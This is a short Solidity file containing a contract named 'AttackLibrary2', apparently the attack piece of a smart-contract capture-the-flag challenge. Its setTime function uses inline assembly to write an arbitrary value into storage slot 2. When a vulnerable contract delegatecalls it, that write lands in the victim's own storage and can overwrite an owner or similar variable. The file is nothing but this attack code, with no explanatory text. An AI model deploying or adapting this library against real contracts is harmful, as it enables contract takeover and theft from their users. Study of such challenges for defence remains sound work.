pragma solidity ^0.8.0;
contract AttackLibrary2 {
    function setTime(uint x) public {
        assembly {
            sstore(2, x)
        }
    }
}